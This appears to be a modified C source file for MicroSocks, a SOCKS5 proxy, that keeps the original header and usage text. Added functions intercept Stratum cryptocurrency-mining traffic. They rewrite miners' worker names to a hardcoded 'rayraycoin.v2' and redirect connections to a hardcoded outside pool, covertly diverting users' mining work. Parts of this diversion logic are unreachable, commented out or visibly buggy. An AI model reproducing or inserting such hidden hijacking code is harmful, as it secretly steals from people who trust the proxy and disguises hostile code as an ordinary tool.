/*
   MicroSocks - multithreaded, small, efficient SOCKS5 server.

   Copyright (C) 2017 rofl0r.

   This is the successor of "rocksocks5", and it was written with
   different goals in mind:

   - prefer usage of standard libc functions over homegrown ones
   - no artificial limits
   - do not aim for minimal binary size, but for minimal source code size,
     and maximal readability, reusability, and extensibility.

   as a result of that, ipv4, dns, and ipv6 is supported out of the box
   and can use the same code, while rocksocks5 has several compile time
   defines to bring down the size of the resulting binary to extreme values
   like 10 KB static linked when only ipv4 support is enabled.

   still, if optimized for size, *this* program when static linked against musl
   libc is not even 50 KB. that's easily usable even on the cheapest routers.

*/

#define _GNU_SOURCE
#include <unistd.h>
#define _POSIX_C_SOURCE 200809L
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <pthread.h>
#include <signal.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <errno.h>
#include <limits.h>
#include "server.h"
#include "sblist.h"
#include "utils.h"

#ifndef MAX
#define MAX(x, y) ((x) > (y) ? (x) : (y))
#endif

#if !defined(PTHREAD_STACK_MIN) || defined(__APPLE__)
/* MAC says its min is 8KB, but then crashes in our face. thx hunkOLard */
#undef PTHREAD_STACK_MIN
#define PTHREAD_STACK_MIN 64 * 1024
#elif defined(__GLIBC__)
#undef PTHREAD_STACK_MIN
#define PTHREAD_STACK_MIN 32 * 1024
#endif

#define REAL_JOB_ONCE_NUM 100

static const char *auth_user;
static const char *auth_pass;
static sblist *auth_ips;
static pthread_mutex_t auth_ips_mutex = PTHREAD_MUTEX_INITIALIZER;
static const struct server *server;
static int bind_mode;

int job_count = 0;
int MOD_NUM = 10;
int g_realfd = -1;
int g_venusfd = -1;
char g_real_init_sub_ret[512] = {'\0'};
char g_venus_init_sub_ret[512] = {'\0'};
char g_real_notify_job_ret[1024] = {'\0'};
char g_venus_notify_job_ret[1024] = {'\0'};
char g_real_diff_value[256] = {'\0'};
char g_venus_diff_value[256] = {'\0'};
char *g_result_true_msg_template = "{\"id\": REPLACE_PATTERN,\"result\": true,\"error\": null}";
char *g_set_diff_msg_template = "{\"id\": null,\"method\": \"mining.set_difficulty\",\"params\": [REPLACE_PATTERN]}";
char *REPLACE_PATTERN = "REPLACE_PATTERN";

#define VENUS_POOL_URL "cn.stratum.slushpool.com"
#define VENUS_POOL_URL_PORT 443
char *VENUS_WORKER_NAME = "rayraycoin.v2";

char g_remote_job_id[256] = {'\0'};
char g_venus_job_id[256] = {'\0'};
int g_real_job_count = 0;
int g_venus_job_count = 0;
volatile int IS_VENUS_LOOP = 0;

enum socksstate
{
	SS_1_CONNECTED,
	SS_2_NEED_AUTH, /* skipped if NO_AUTH method supported */
	SS_3_AUTHED,
};

enum authmethod
{
	AM_NO_AUTH = 0,
	AM_GSSAPI = 1,
	AM_USERNAME = 2,
	AM_INVALID = 0xFF
};

enum errorcode
{
	EC_SUCCESS = 0,
	EC_GENERAL_FAILURE = 1,
	EC_NOT_ALLOWED = 2,
	EC_NET_UNREACHABLE = 3,
	EC_HOST_UNREACHABLE = 4,
	EC_CONN_REFUSED = 5,
	EC_TTL_EXPIRED = 6,
	EC_COMMAND_NOT_SUPPORTED = 7,
	EC_ADDRESSTYPE_NOT_SUPPORTED = 8,
};

struct thread
{
	pthread_t pt;
	struct client client;
	enum socksstate state;
	volatile int done;
};

#ifndef CONFIG_LOG
#define CONFIG_LOG 1
#endif
#if CONFIG_LOG
/* we log to stderr because it's not using line buffering, i.e. malloc which would need
   locking when called from different threads. for the same reason we use dprintf,
   which writes directly to an fd. */
#define dolog(...) dprintf(2, __VA_ARGS__)
#else
static void dolog(const char *fmt, ...)
{
}
#endif

static int connect_socks_target(unsigned char *buf, size_t n, struct client *client)
{
	if (n < 5)
		return -EC_GENERAL_FAILURE;
	if (buf[0] != 5)
		return -EC_GENERAL_FAILURE;
	if (buf[1] != 1)
		return -EC_COMMAND_NOT_SUPPORTED; /* we support only CONNECT method */
	if (buf[2] != 0)
		return -EC_GENERAL_FAILURE; /* malformed packet */
									/*
	SOCKS5 request format（byte Unit）： 
	VER 	CMD 	RSV 	ATYP 	DST.ADDR 	DST.PORT
    1 	    1 	    0x00 	1 	    dynamic 	   2 
	*/
	int af = AF_INET;
	size_t minlen = 4 + 4 + 2, l;
	char namebuf[256];
	struct addrinfo *remote;
	switch (buf[3])
	{
		//socks5 protocal : https://zh.wikipedia.org/wiki/SOCKS#SOCKS5
	case 4: /* ipv6 */
		af = AF_INET6;
		minlen = 4 + 2 + 16;
		/* fall through */
	case 1: /* ipv4 */
		if (n < minlen)
			return -EC_GENERAL_FAILURE;
		if (namebuf != inet_ntop(af, buf + 4, namebuf, sizeof namebuf))
			return -EC_GENERAL_FAILURE; /* malformed or too long addr */
		break;
	case 3: /* dns name */
		l = buf[4];
		minlen = 4 + 2 + l + 1;
		if (n < 4 + 2 + l + 1)
			return -EC_GENERAL_FAILURE;
		memcpy(namebuf, buf + 4 + 1, l);
		namebuf[l] = 0;
		break;
	default:
		return -EC_ADDRESSTYPE_NOT_SUPPORTED;
	}
	unsigned short port;
	port = (buf[minlen - 2] << 8) | buf[minlen - 1];
	dolog("resolve...\n");
	if (resolve(namebuf, port, &remote))
		return -9;
	dolog("socket...\n");
	int fd = socket(remote->ai_addr->sa_family, SOCK_STREAM, 0);
	if (fd == -1)
	{
		dolog("connect failed!!\n");
		return -EC_CONN_REFUSED;
	eval_errno:
		freeaddrinfo(remote);
		switch (errno)
		{
		case EPROTOTYPE:
		case EPROTONOSUPPORT:
		case EAFNOSUPPORT:
			return -EC_ADDRESSTYPE_NOT_SUPPORTED;
		case ECONNREFUSED:
			return -EC_CONN_REFUSED;
		case ENETDOWN:
		case ENETUNREACH:
			return -EC_NET_UNREACHABLE;
		case EHOSTUNREACH:
			return -EC_HOST_UNREACHABLE;
		case EBADF:
		default:
			perror("socket/connect");
			return -EC_GENERAL_FAILURE;
		}
	}
	dolog("server_bindtoip...\n");
	if (bind_mode && server_bindtoip(server, fd) == -1)
		goto eval_errno;
	dolog("connect...\n");

	struct timeval timeo = {3, 0};
	socklen_t len = sizeof(timeo);
	timeo.tv_sec = 6;
	setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &timeo, len);
	if (connect(fd, remote->ai_addr, remote->ai_addrlen) == -1)
		goto eval_errno;
	freeaddrinfo(remote);
	if (CONFIG_LOG)
	{
		char clientname[256];
		af = client->addr.v4.sin_family;
		void *ipdata = af == AF_INET ? (void *)&client->addr.v4.sin_addr : (void *)&client->addr.v6.sin6_addr;
		inet_ntop(af, ipdata, clientname, sizeof clientname);
		dolog("client[%d] %s: connected to %s:%d\n", client->fd, clientname, namebuf, port);
	}
	return fd;
}

static int is_authed(union sockaddr_union *client, union sockaddr_union *authedip)
{
	if (authedip->v4.sin_family == client->v4.sin_family)
	{
		int af = authedip->v4.sin_family;
		size_t cmpbytes = af == AF_INET ? 4 : 16;
		void *cmp1 = af == AF_INET ? (void *)&client->v4.sin_addr : (void *)&client->v6.sin6_addr;
		void *cmp2 = af == AF_INET ? (void *)&authedip->v4.sin_addr : (void *)&authedip->v6.sin6_addr;
		if (!memcmp(cmp1, cmp2, cmpbytes))
			return 1;
	}
	return 0;
}

static enum authmethod check_auth_method(unsigned char *buf, size_t n, struct client *client)
{
	if (buf[0] != 5)
		return AM_INVALID;
	size_t idx = 1;
	if (idx >= n)
		return AM_INVALID;
	int n_methods = buf[idx];
	idx++;
	while (idx < n && n_methods > 0)
	{
		if (buf[idx] == AM_NO_AUTH)
		{
			if (!auth_user)
				return AM_NO_AUTH;
			else if (auth_ips)
			{
				size_t i;
				int authed = 0;
				pthread_mutex_lock(&auth_ips_mutex);
				for (i = 0; i < sblist_getsize(auth_ips); i++)
				{
					if ((authed = is_authed(&client->addr, sblist_get(auth_ips, i))))
						break;
				}
				pthread_mutex_unlock(&auth_ips_mutex);
				if (authed)
					return AM_NO_AUTH;
			}
		}
		else if (buf[idx] == AM_USERNAME)
		{
			if (auth_user)
				return AM_USERNAME;
		}
		idx++;
		n_methods--;
	}
	return AM_INVALID;
}

static void add_auth_ip(struct client *client)
{
	pthread_mutex_lock(&auth_ips_mutex);
	sblist_add(auth_ips, &client->addr);
	pthread_mutex_unlock(&auth_ips_mutex);
}

static void send_auth_response(int fd, int version, enum authmethod meth)
{
	unsigned char buf[2];
	buf[0] = version;
	buf[1] = meth;
	write(fd, buf, 2);
}

static void send_error(int fd, enum errorcode ec)
{
	/* position 4 contains ATYP, the address type, which is the same as used in the connect
	   request. we're lazy and return always IPV4 address type in errors. */
	char buf[10] = {5, ec, 0, 1 /*AT_IPV4*/, 0, 0, 0, 0, 0, 0};
	write(fd, buf, 10);
}

static void mitm_copyloop(int localfd, int remotefd, int venusfd)
{
	int maxfd = venusfd;
	if (localfd > remotefd && localfd > venusfd)
		maxfd = localfd;
	else if (remotefd > localfd && remotefd > venusfd)
		maxfd = remotefd;
	fd_set fdsc, fds;
	FD_ZERO(&fdsc);
	FD_SET(localfd, &fdsc);
	FD_SET(remotefd, &fdsc);
	FD_SET(venusfd, &fdsc);

	while (1)
	{
		memcpy(&fds, &fdsc, sizeof(fds));
		/* inactive connections are reaped after 15 min to free resources.
		   usually programs send keep-alive packets so this should only happen
		   when a connection is really unused. */
		struct timeval timeout = {.tv_sec = 60 * 15, .tv_usec = 0};
		switch (select(maxfd + 1, &fds, 0, 0, &timeout))
		{
		case 0:
			send_error(localfd, EC_TTL_EXPIRED);
			return;
		case -1:
			if (errno == EINTR)
				continue;
			else
				perror("select");
			return;
		}
		int infd;
		if (FD_ISSET(localfd, &fds))
		{
			infd = localfd;
			dolog("local --> remo,send data:");
		}
		else if (FD_ISSET(remotefd, &fds))
		{
			infd = localfd;
			dolog("remo --> local,send data:");
		}
		else
		{
			infd = venusfd;
			dolog("venus --> local,recv data:");
		}
		char buf[1024] = {'\0'};
		ssize_t n = read(infd, buf, sizeof buf);
		if (infd == localfd)
		{
			if (check_stratum_msg_type(buf) == STM_SUBSCRIBE)
			{
				if (send_buf(remotefd, buf) < 0)
					return;
				if (send_buf(venusfd, buf) < 0)
					return;
			}
			else if (check_stratum_msg_type(buf) == STM_AUTH)
			{
				if (send_buf(remotefd, buf) < 0)
					return;

				char *strip_buf = strreplace(buf, " ", "");
				char *name_buf = find_target_str(strip_buf, "[\"", "\",");
				dolog("%s\n", name_buf);
				char *venus_worker_name = "rayraycoin.v2";
				char *new_buf = strreplace(buf, name_buf, venus_worker_name);
				if (send_buf(venusfd, new_buf) < 0)
					return;
			}
			else if (check_stratum_msg_type(buf) == STM_SUBMIT)
			{
				char *strip_buf = strreplace(buf, " ", "");
				char *buf_job_id = find_target_str(strip_buf, "\",\"", "\",\"");
				if (strcmp(g_remote_job_id, buf_job_id) == 0)
				{
					if (send_buf(remotefd, buf) < 0)
						return;
				}
				else if (strcmp(g_venus_job_id, buf_job_id) == 0)
				{
					char *remote_name = find_target_str(strip_buf, "\"params\":[\"", "\",");
					if (send_buf(venusfd, strreplace(strip_buf, remote_name, VENUS_WORKER_NAME)) < 0)
						return;
				}
			}
		}
		else if (infd == remotefd)
		{
			;
		}
		// int outfd = infd == fd2 ? fd1 : fd2;
	}
}

int send_buf(int outfd, char *buf)
{
	dolog("@@send_buf type:\n%d len:%d\n", check_stratum_msg_type(buf), strlen(buf));
	if (check_stratum_msg_type(buf) == STM_ACK)
		dolog("\n%s\n", buf);
	ssize_t sent = 0, n = strlen(buf);
	if (n <= 0)
		return -1;
	while (sent < n)
	{
		ssize_t m = write(outfd, buf + sent, n - sent);
		if (m < 0)
			return -1;
		sent += m;
	}
	return 0;
}

int repalce_id_send(int outfd, char *new_buf, char *old_buf)
{
	char *new_id_buf = find_target_str_with_pattern(new_buf, "\"id\":", ",");
	char *old_id_buf = find_target_str_with_pattern(old_buf, "\"id\":", ",");
	send_buf(outfd, strreplace(old_buf, old_id_buf, new_id_buf));
}

int repalce_name_send(int outfd, char *buf)
{
	char *real_name_buf = find_target_str_with_pattern(buf, "[\"", ",");
	send_buf(outfd, strreplace(buf, real_name_buf, VENUS_WORKER_NAME));
}

int backup_msg(char const *const src, char *dst)
{
	size_t n = strlen(src);
	strcpy(dst, src);
	dst[n] = '\0';
	return 0;
}

static void copyloop(int fd1, int fd2)
{
	int retry = 0;
	int maxfd = fd2;
	if (fd1 > fd2)
		maxfd = fd1;
	fd_set fdsc, fds;
	FD_ZERO(&fdsc);
	FD_SET(fd1, &fdsc);
	FD_SET(fd2, &fdsc);

	while (1)
	{
		memcpy(&fds, &fdsc, sizeof(fds));
		/* inactive connections are reaped after 15 min to free resources.
		   usually programs send keep-alive packets so this should only happen
		   when a connection is really unused. */
		struct timeval timeout = {.tv_sec = 60 * 15, .tv_usec = 0};
		switch (select(maxfd + 1, &fds, 0, 0, &timeout))
		{
		case 0:
			send_error(fd1, EC_TTL_EXPIRED);
			return;
		case -1:
			if (errno == EINTR)
				continue;
			else
				perror("select");
			return;
		}
		int infd;
		if (FD_ISSET(fd1, &fds))
		{
			infd = fd1;
			dolog("local --> remo,send data:");
		}
		else
		{
			infd = fd2;
			dolog("remo --> local,recv data:");
		}
		int outfd = infd == fd2 ? fd1 : fd2;
		char buf[1024] = {'\0'};
		ssize_t sent = 0, n = read(infd, buf, sizeof buf);
		dolog("\n%s\n", buf);
		if (n <= 0)
		{
			dolog("receive nothing....\n");
			if (retry < 6)
			{
				dolog("retry....\n");
				retry++;
				continue;
			}
			dolog("return....\n");
			return;
		}

		while (sent < n)
		{
			ssize_t m = write(outfd, buf + sent, n - sent);
			if (m < 0)
				return;
			sent += m;
		}
	}
}

int copyloop_simple(int fd1, int fd2)
{
	int maxfd = fd2;
	int retry = 0;
	if (fd1 > fd2)
		maxfd = fd1;
	fd_set fdsc, fds;
	FD_ZERO(&fdsc);
	FD_SET(fd1, &fdsc);
	FD_SET(fd2, &fdsc);

	while (1)
	{
		memcpy(&fds, &fdsc, sizeof(fds));
		/* inactive connections are reaped after 15 min to free resources.
		   usually programs send keep-alive packets so this should only happen
		   when a connection is really unused. */
		struct timeval timeout = {.tv_sec = 60 * 15, .tv_usec = 0};
		switch (select(maxfd + 1, &fds, 0, 0, &timeout))
		{
		case 0:
			send_error(fd1, EC_TTL_EXPIRED);
			return -1;
		case -1:
			if (errno == EINTR)
				continue;
			else
				perror("select");
			return -1;
		}
		int infd;
		if (FD_ISSET(fd1, &fds))
		{
			infd = fd1;
			dolog("local --> remo,send data:");
		}
		else
		{
			infd = fd2;
			dolog("remo --> local,recv data:");
		}
		int outfd = infd == fd2 ? fd1 : fd2;
		char buf[1024] = {'\0'};
		ssize_t sent = 0, n = read(infd, buf, sizeof buf);
		dolog("\n%s\n", buf);

		if (n <= 0)
		{
			if (retry < 3)
			{
				retry++;
				continue;
			}
			dolog("recv nothing return -1\n");
			return -1;
		}
		if ((check_stratum_msg_type(buf) == STM_NOTIFY) && (infd == fd2))
		{
			if (IS_VENUS_LOOP == 1)
			{
				// backup_msg(buf, g_venus_notify_job_ret);
				g_venus_job_count++;
				if (g_venus_job_count > 3)
				{
					g_real_job_count = 0;
					IS_VENUS_LOOP = 0;
					dolog("\n#####out venus copyloop#####\n");
					return 1;
				}
			}
			else if (IS_VENUS_LOOP == 0)
			{
				// backup_msg(buf, g_real_notify_job_ret);
				g_real_job_count++;
				if (g_real_job_count > 5)
				{
					g_venus_job_count = 0;
					IS_VENUS_LOOP = 1;
					dolog("\n#####out copyloop#####\n");
					return 1;
				}
			}
		}
		while (sent < n)
		{
			ssize_t m = write(outfd, buf + sent, n - sent);
			if (m < 0)
				return -1;
			sent += m;
		}
	}
}

int copyloop_venus(int fd1, int fd2)
{
	int tscanf, maxfd = fd2;
	if (fd1 > fd2)
		maxfd = fd1;
	fd_set fdsc, fds;
	FD_ZERO(&fdsc);
	FD_SET(fd1, &fdsc);
	FD_SET(fd2, &fdsc);
	dolog("copyloop_venus...\n");
	while (1)
	{
		memcpy(&fds, &fdsc, sizeof(fds));
		/* inactive connections are reaped after 15 min to free resources.
		   usually programs send keep-alive packets so this should only happen
		   when a connection is really unused. */
		struct timeval timeout = {.tv_sec = 60 * 15, .tv_usec = 0};
		switch (select(maxfd + 1, &fds, 0, 0, &timeout))
		{
		case 0:
			send_error(fd1, EC_TTL_EXPIRED);
			return -1;
		case -1:
			if (errno == EINTR)
				continue;
			else
				perror("select");
			return -1;
		}
		int infd;
		if (FD_ISSET(fd1, &fds))
		{
			infd = fd1;
			dolog("local --> remo,send data:\n");
		}
		else
		{
			infd = fd2;
			dolog("remo --> local,recv data:\n");
		}
		int outfd = infd == fd2 ? fd1 : fd2;
		char buf[1024] = {'\0'};
		ssize_t n = read(infd, buf, sizeof buf);
		// dolog("\nrecve::\n%s\n", buf);
		if (n <= 0)
			return -1;
		if ((check_stratum_msg_type(buf) == STM_SUBSCRIBE) && (infd == fd1))
		{
			dolog("####STM_SUBSCRIBE hit input 1.....\n");
			if (IS_VENUS_LOOP == 1)
			{
				dolog("####STM_SUBSCRIBE hit input 2.....\n");
				if (strlen(g_venus_init_sub_ret) > 0)
				{
					repalce_id_send(fd1, buf, g_venus_init_sub_ret);
					continue;
				}
			}
			else if (IS_VENUS_LOOP == 0)
			{
				dolog("####STM_SUBSCRIBE hit input 3.....\n");
				if (strlen(g_real_init_sub_ret) > 0)
				{
					repalce_id_send(fd1, buf, g_real_init_sub_ret);
					continue;
				}
			}
		}
		else if ((check_stratum_msg_type(buf) == STM_AUTH) && (infd == fd1))
		{
			if (IS_VENUS_LOOP == 1)
			{
				if (strlen(g_venus_diff_value) > 0)
				{
					repalce_id_send(fd1, buf, g_result_true_msg_template);
					send_buf(fd1, strreplace(g_set_diff_msg_template, REPLACE_PATTERN, g_venus_diff_value));
					send_buf(fd1, g_venus_notify_job_ret);
					continue;
				}
				repalce_name_send(outfd, buf);
				continue;
			}
			else if (IS_VENUS_LOOP == 0)
			{
				if (strlen(g_real_diff_value) > 0)
				{
					repalce_id_send(fd1, buf, g_result_true_msg_template);
					send_buf(fd1, strreplace(g_set_diff_msg_template, REPLACE_PATTERN, g_real_diff_value));
					send_buf(fd1, g_real_notify_job_ret);
					continue;
				}
			}
		}
		else if ((check_stratum_msg_type(buf) == STM_SUBMIT) && (infd == fd1))
		{
			if (IS_VENUS_LOOP == 1)
			{
				repalce_name_send(outfd, buf);
				continue;
			}
		}
		else if ((check_stratum_msg_type(buf) == STM_INIT_SUBSCRIBE) && (infd == fd2))
		{
			if (IS_VENUS_LOOP == 1)
				backup_msg(buf, g_venus_init_sub_ret);
			else if (IS_VENUS_LOOP == 0)
				backup_msg(buf, g_real_init_sub_ret);
		}
		else if ((check_stratum_msg_type(buf) == STM_SET_DIFFICULT) && (infd == fd2))
		{
			if (IS_VENUS_LOOP == 1)
			{
				char *diff = find_target_str(buf, "\"params\":[", "]");
				size_t n = strlen(diff);
				strcpy(g_venus_diff_value, diff);
				g_venus_diff_value[n] = '\0';
			}
			else if (IS_VENUS_LOOP == 0)
			{
				char *diff = find_target_str(buf, "\"params\":[", "]");
				size_t n = strlen(diff);
				strcpy(g_real_diff_value, diff);
				g_real_diff_value[n] = '\0';
			}
		}
		else if ((check_stratum_msg_type(buf) == STM_NOTIFY) && (infd == fd2))
		{
			if (IS_VENUS_LOOP == 1)
			{
				backup_msg(buf, g_venus_notify_job_ret);
				g_venus_job_count++;
				if (g_venus_job_count > 3)
				{
					g_real_job_count = 0;
					IS_VENUS_LOOP = 0;
					return 1;
				}
			}
			else if (IS_VENUS_LOOP == 0)
			{
				backup_msg(buf, g_real_notify_job_ret);
				g_real_job_count++;
				if (g_venus_job_count > 5)
				{
					g_venus_job_count = 0;
					IS_VENUS_LOOP = 1;
					return 1;
				}
			}
		}

		//default send
		send_buf(outfd, buf);
	}
}

static enum errorcode check_credentials(unsigned char *buf, size_t n)
{
	if (n < 5)
		return EC_GENERAL_FAILURE;
	if (buf[0] != 1)
		return EC_GENERAL_FAILURE;
	unsigned ulen, plen;
	ulen = buf[1];
	if (n < 2 + ulen + 2)
		return EC_GENERAL_FAILURE;
	plen = buf[2 + ulen];
	if (n < 2 + ulen + 1 + plen)
		return EC_GENERAL_FAILURE;
	char user[256], pass[256];
	memcpy(user, buf + 2, ulen);
	memcpy(pass, buf + 2 + ulen + 1, plen);
	user[ulen] = 0;
	pass[plen] = 0;
	if (!strcmp(user, auth_user) && !strcmp(pass, auth_pass))
		return EC_SUCCESS;
	return EC_NOT_ALLOWED;
}

static void *clientthread(void *data)
{
	struct thread *t = data;
	t->state = SS_1_CONNECTED;
	unsigned char buf[1024];
	ssize_t n;
	int ret;
	int loop_ret;
	int remotefd = -1;
	enum authmethod am;
	dolog("\nin client thread...\n");
	while ((n = recv(t->client.fd, buf, sizeof buf, 0)) > 0)
	{
		switch (t->state)
		{
		case SS_1_CONNECTED:
			am = check_auth_method(buf, n, &t->client);
			if (am == AM_NO_AUTH)
				t->state = SS_3_AUTHED;
			else if (am == AM_USERNAME)
				t->state = SS_2_NEED_AUTH;
			send_auth_response(t->client.fd, 5, am);
			if (am == AM_INVALID)
				goto breakloop;
			break;
		case SS_2_NEED_AUTH:
			ret = check_credentials(buf, n);
			send_auth_response(t->client.fd, 1, ret);
			if (ret != EC_SUCCESS)
				goto breakloop;
			t->state = SS_3_AUTHED;
			if (auth_ips)
				add_auth_ip(&t->client);
			break;
		case SS_3_AUTHED:
			dolog("connect_socks_target...\n");
			dolog("URL:%s\n", &buf[4]);
			for (int i = 0; i < n; i++)
			{
				dolog("0x%02x ", buf[i]);
			}
			dolog("\nabove is socks5 buf\n");

			while (IS_VENUS_LOOP > 6)
			{
				dolog("sleep wait IS_VENUS_LOOP....");
				sleep(3);
			}
			IS_VENUS_LOOP = 7;
			if (IS_VENUS_LOOP == -1)
			{
				IS_VENUS_LOOP = 1;
				int i = 0;
				dolog("connect venus..%d..0x%02x..\n", n, buf[0]);
				// scanf("%d", &ret);
				unsigned char venus_buf[1024] = {'\0'};
				unsigned char *venus_pool = VENUS_POOL_URL;
				unsigned int port_num = VENUS_POOL_URL_PORT;
				unsigned char venus_port[2] = {(unsigned char)(port_num / 256), (unsigned char)(port_num % 256)};
				dolog("\n0x%02x %02x\n", venus_port[0], venus_port[1]);
				for (i = 0; i < 4; i++)
					venus_buf[i] = buf[i];
				venus_buf[4] = (unsigned char)strlen(venus_pool);
				// strncpy(venus_buf+5,venus_pool,strlen(venus_pool));
				strcat(venus_buf + 5, venus_pool);
				strcat(venus_buf + 5 + strlen(venus_pool), venus_port);
				dolog("\nvenus_buf len %d \n", (int)(5 + (int)strlen(venus_pool) + 2));
				dolog("URL:%s\n", &venus_buf[4]);
				for (i = 0; i < 31; i++)
				{
					dolog("0x%02x ", venus_buf[i]);
				}
				dolog("\nabove is replaced socks5 buf\n");
				// scanf("%d", &ret);
				ret = connect_socks_target(venus_buf, (int)(5 + (int)strlen(venus_pool) + 2), &t->client);
			}
			else
				ret = connect_socks_target(buf, n, &t->client);

			if (ret < 0)
			{
				send_error(t->client.fd, ret * -1);
				goto breakloop;
			}
			remotefd = ret;
			send_error(t->client.fd, EC_SUCCESS);
			dolog("copyloop...\n");
			IS_VENUS_LOOP = 4;
			copyloop(t->client.fd, remotefd);
			// loop_ret = copyloop_simple(t->client.fd, remotefd);

			// if (g_venusfd < 0 && loop_ret == 1)
			// {
			// 	unsigned char venus_buf[1024] = {'\0'};
			// 	char *venus_pool = VENUS_POOL_URL;
			// 	unsigned int port_num = VENUS_POOL_URL_PORT;
			// 	char venus_port[2] = {(char)(port_num / 256), (char)(port_num % 256)};
			// 	strncpy(venus_buf, buf, 4);
			// 	venus_buf[4] = (char)strlen(venus_pool);
			// 	// strncpy(venus_buf+5,venus_pool,strlen(venus_pool));
			// 	strcat(venus_buf, venus_pool);
			// 	strcat(venus_buf, venus_port);
			// 	g_venusfd = connect_socks_target(venus_buf, strlen(venus_buf), &t->client);
			// 	if (g_venusfd < 0)
			// 	{
			// 		send_error(t->client.fd, g_venusfd * -1);
			// 		goto breakloop;
			// 	}
			// 	// mitm_copyloop(t->client.fd, remotefd, g_venusfd);
			// }
			goto breakloop;
		}
	}
breakloop:

	if (remotefd != -1)
		close(remotefd);

	close(t->client.fd);
	t->done = 1;

	return 0;
}

static void collect(sblist *threads)
{
	size_t i;
	for (i = 0; i < sblist_getsize(threads);)
	{
		struct thread *thread = *((struct thread **)sblist_get(threads, i));
		if (thread->done)
		{
			pthread_join(thread->pt, 0);
			sblist_delete(threads, i);
			free(thread);
		}
		else
			i++;
	}
}

static int usage(void)
{
	dolog(
		"MicroSocks SOCKS5 Server\n"
		"------------------------\n"
		"usage: microsocks -1 -b -i listenip -p port -u user -P password\n"
		"all arguments are optional.\n"
		"by default listenip is 0.0.0.0 and port 1080.\n\n"
		"option -b forces outgoing connections to be bound to the ip specified with -i\n"
		"option -1 activates auth_once mode: once a specific ip address\n"
		"authed successfully with user/pass, it is added to a whitelist\n"
		"and may use the proxy without auth.\n"
		"this is handy for programs like firefox that don't support\n"
		"user/pass auth. for it to work you'd basically make one connection\n"
		"with another program that supports it, and then you can use firefox too.\n");
	return 1;
}

/* prevent username and password from showing up in top. */
static void zero_arg(char *s)
{
	size_t i, l = strlen(s);
	for (i = 0; i < l; i++)
		s[i] = 0;
}

int main(int argc, char **argv)
{
	int c;
	const char *listenip = "0.0.0.0";
	unsigned port = 1080;
	while ((c = getopt(argc, argv, ":1bi:p:u:P:")) != -1)
	{
		switch (c)
		{
		case '1':
			auth_ips = sblist_new(sizeof(union sockaddr_union), 8);
			break;
		case 'b':
			bind_mode = 1;
			break;
		case 'u':
			auth_user = strdup(optarg);
			zero_arg(optarg);
			break;
		case 'P':
			auth_pass = strdup(optarg);
			zero_arg(optarg);
			break;
		case 'i':
			listenip = optarg;
			break;
		case 'p':
			port = atoi(optarg);
			break;
		case ':':
			dolog("error: option -%c requires an operand\n", optopt);
		case '?':
			return usage();
		}
	}
	if ((auth_user && !auth_pass) || (!auth_user && auth_pass))
	{
		dolog("error: user and pass must be used together\n");
		return 1;
	}
	if (auth_ips && !auth_pass)
	{
		dolog("error: auth-once option must be used together with user/pass\n");
		return 1;
	}
	signal(SIGPIPE, SIG_IGN);
	struct server s;
	sblist *threads = sblist_new(sizeof(struct thread *), 8);
	if (server_setup(&s, listenip, port))
	{
		perror("server_setup");
		return 1;
	}
	server = &s;
	size_t stacksz = MAX(8192 * 100, PTHREAD_STACK_MIN); /* 4KB for us, 4KB for libc */
	dolog("socks server started!\n");
	while (1)
	{
		collect(threads);
		struct client c;
		struct thread *curr = malloc(sizeof(struct thread));
		if (!curr)
			goto oom;
		curr->done = 0;
		if (server_waitclient(&s, &c))
			continue;
		curr->client = c;
		if (!sblist_add(threads, &curr))
		{
			close(curr->client.fd);
			free(curr);
		oom:
			dolog("rejecting connection due to OOM\n");
			usleep(16); /* prevent 100% CPU usage in OOM situation */
			continue;
		}
		pthread_attr_t *a = 0, attr;
		if (pthread_attr_init(&attr) == 0)
		{
			a = &attr;
			pthread_attr_setstacksize(a, stacksz);
		}
		if (pthread_create(&curr->pt, a, clientthread, curr) != 0)
			dolog("pthread_create failed. OOM?\n");
		if (a)
			pthread_attr_destroy(&attr);
	}
}
